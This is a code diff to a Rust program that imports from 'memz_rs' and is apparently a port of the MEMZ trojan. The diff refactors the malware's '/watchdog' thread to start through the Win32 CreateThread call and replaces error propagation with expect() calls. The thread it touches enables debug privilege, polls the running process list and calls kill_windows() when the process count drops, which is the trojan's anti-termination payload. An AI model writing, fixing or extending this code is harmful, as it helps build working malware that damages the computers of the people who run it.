@@ -20,6 +20,7 @@ use memz_rs::{
     LMEM_ZEROINIT, MEM_ZEROINIT,
 };
 use std::{
+    ffi::c_void,
     mem::size_of,
     process,
     thread::{self, sleep},
@@ -41,7 +42,10 @@ use windows::{
         },
         System::{
             Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
-            Threading::{OpenProcess, HIGH_PRIORITY_CLASS, PROCESS_QUERY_INFORMATION},
+            Threading::{
+                CreateThread, OpenProcess, HIGH_PRIORITY_CLASS, LPTHREAD_START_ROUTINE,
+                PROCESS_QUERY_INFORMATION, THREAD_CREATION_FLAGS,
+            },
         },
         UI::{
             Shell::{ShellExecuteExW, SEE_MASK_NOCLOSEPROCESS, SHELLEXECUTEINFOW},
@@ -75,8 +79,19 @@ fn main() -> Result<(), WinError> {
     };
 
     if arg == "/watchdog" {
-        thread::spawn(watchdog_thread);
-        // watchdog_thread.join().unwrap().unwrap();
+        unsafe {
+            match CreateThread(
+                None,
+                usize::default(),
+                LPTHREAD_START_ROUTINE::Some(watchdog_thread),
+                None,
+                THREAD_CREATION_FLAGS::default(),
+                None,
+            ) {
+                Ok(h) => h,
+                Err(e) => panic!("Failed CreateThread\n{e:?}")
+            };
+        }
 
         let c: WNDCLASSEXA = WNDCLASSEXA {
             cbSize: size_of::<WNDCLASSEXA>() as u32,
@@ -282,10 +297,10 @@ fn main() -> Result<(), WinError> {
     }
 }
 
-fn watchdog_thread() -> Result<(), WinError> {
+unsafe extern "system" fn watchdog_thread(_param: *mut c_void) -> u32 {
     let mut oproc = 0;
     let mut f_buf1: Vec<u8> = vec![MEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
-    wrap_get_process_image_filename_a(&mut f_buf1)?;
+    wrap_get_process_image_filename_a(&mut f_buf1).expect("Failed GetProcessImageFilenameA");
     #[cfg(feature = "DEBUG_MODE")]
     {
         let data = format!("f_buf1: {}", std::str::from_utf8(&f_buf1).unwrap());
@@ -295,7 +310,7 @@ fn watchdog_thread() -> Result<(), WinError> {
     }
     sleep(Duration::from_millis(1000));
 
-    set_privilege(SE_DEBUG_NAME, true)?;
+    set_privilege(SE_DEBUG_NAME, true).expect("Failed SetPrivilege");
 
     #[cfg(feature = "DEBUG_MODE")]
     {
@@ -306,7 +321,7 @@ fn watchdog_thread() -> Result<(), WinError> {
         );
     }
     loop {
-        let snapshot = wrap_create_toolhelp32_snapshot()?;
+        let snapshot = wrap_create_toolhelp32_snapshot().expect("Failed CreateTool32Snapshot");
         #[cfg(feature = "DEBUG_MODE")]
         {
             write_log(
@@ -377,7 +392,7 @@ fn watchdog_thread() -> Result<(), WinError> {
                 sleep(Duration::from_millis(500));
             }
             let mut f_buf2: Vec<u8> = vec![MEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
-            wrap_get_process_image_filename_a(&mut f_buf2)?;
+            wrap_get_process_image_filename_a(&mut f_buf2).expect("Failed GetProcessImageFilenameA");
             #[cfg(feature = "DEBUG_MODE")]
             {
                 let data = format!("f_buf2: {}", std::str::from_utf8(&f_buf2).unwrap());
@@ -398,7 +413,7 @@ fn watchdog_thread() -> Result<(), WinError> {
                 }
             }
 
-            wrap_close_handle(h_proc.unwrap_or(INVALID_HANDLE_VALUE))?;
+            wrap_close_handle(h_proc.unwrap_or(INVALID_HANDLE_VALUE)).expect("Failed CloseHandle");
             drop(f_buf2);
 
             #[cfg(not(feature = "DEBUG_MODE"))]
@@ -433,10 +448,10 @@ fn watchdog_thread() -> Result<(), WinError> {
                 sleep(Duration::from_millis(500));
             }
         }
-        wrap_close_handle(snapshot)?;
+        wrap_close_handle(snapshot).expect("Failed CloseHandle");
 
         if nproc < oproc {
-            kill_windows()?;
+            kill_windows().expect("Failed KillWindows Proc");
         }
         oproc = nproc;
 
